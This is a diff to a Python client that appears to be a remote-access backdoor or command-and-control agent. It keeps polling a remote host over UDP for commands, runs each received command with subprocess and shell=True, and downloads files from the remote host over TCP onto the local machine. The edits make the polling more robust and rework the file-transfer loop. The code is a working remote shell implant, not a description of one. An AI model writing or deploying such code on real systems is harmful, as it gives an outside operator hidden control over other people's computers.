@@ -17,10 +17,13 @@ tcp_buffer_size = 4096
 
 def get_command(request, sock, host, port):
     print("[-] Requesting command...")
-    # https://theprogrammingexpert.com/python-int-to-bytes/
-    # int to byte
-    sock.sendto(commands.to_byte(request), (host, port))
-    return sock.recv(udp_buffer_size).decode()
+
+    while True:
+        try:
+            sock.sendto(commands.to_byte(request), (host, port))
+            return sock.recv(udp_buffer_size).decode()
+        except TimeoutError:
+            print("Timed out, sending new request")
 
 
 def tcp_thread(host, port):
@@ -74,21 +77,22 @@ try:
         if command == 'file':
             f = None
             tcp_connection = socket.socket()
+            print("Waiting on file name connection.")
+            file_name = get_command(Commands.FILENAME, s, REMOTE_HOST, REMOTE_PORT)
             try:
                 tcp_connection.connect((REMOTE_HOST, REMOTE_TRANSFER_PORT))
-                file_name = get_command(Commands.FILENAME, s, REMOTE_HOST, REMOTE_PORT)
                 f = open(file_name, 'a')
-                # TODO: loop tcp receive until done.
-                current_input = tcp_connection.recv(tcp_buffer_size).decode()
+                current_input = commands.from_byte(tcp_connection.recv(tcp_buffer_size).decode())
                 print(current_input)
                 while commands.str_to_command(current_input) != Commands.END_TRANSFER:
+                    current_input = tcp_connection.recv(tcp_buffer_size).decode()
                     print(current_input)
                     f.write(current_input)
-                    current_input = tcp_connection.recv(tcp_buffer_size).decode()
+
             finally:
                 tcp_connection.close()
                 f.close()
-        else:
+        elif command is not None:
             op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
             output = op.stdout.read()
             output_error = op.stderr.read()
